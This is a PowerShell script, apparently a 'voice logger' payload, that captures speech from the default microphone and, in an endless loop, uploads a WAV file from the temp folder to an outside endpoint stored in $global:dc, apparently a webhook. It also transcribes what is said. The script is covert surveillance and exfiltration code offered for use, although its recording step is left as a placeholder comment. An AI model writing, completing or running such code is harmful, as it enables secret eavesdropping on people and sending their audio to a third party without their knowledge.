function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$filePath
    )

    if (-not ([string]::IsNullOrEmpty($filePath)) -and (Test-Path $filePath)) {
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

        $fileHeader = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
Content-Type: application/octet-stream

"@
        $fileFooter = "--$boundary--"

        $bodyBytes = ([Text.Encoding]::UTF8.GetBytes($fileHeader) + $fileBytes + [Text.Encoding]::UTF8.GetBytes($fileFooter))
        
        Invoke-RestMethod -ContentType $contentType -Uri $global:dc -Method Post -Body $bodyBytes
    } else {
        Write-Host "File path is either empty or the file does not exist: $filePath"
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    $waveFilePath = "$env:tmp\VoiceLog.wav"
    
    # Mock recording placeholder - ensure the WAV file is created by your recording method.

    while ($true) {
        if (Test-Path $waveFilePath) {
            DC-Upload $waveFilePath
            # Optional: Remove the WAV file after upload
            # Remove-Item $waveFilePath

            $result = $recognizer.Recognize()
            if ($result) {
                Write-Output $result.Text
                switch -regex ($result.Text) {
                    '\bnote\b' {Start-Process notepad}
                    '\bexit\b' {break}
                }
            }
        } else {
            Write-Host "Error: The audio file was not found at $waveFilePath"
        }

        Start-Sleep -Seconds 10  # Sleep to avoid high CPU usage, adjust as needed
    }
}

voiceLogger
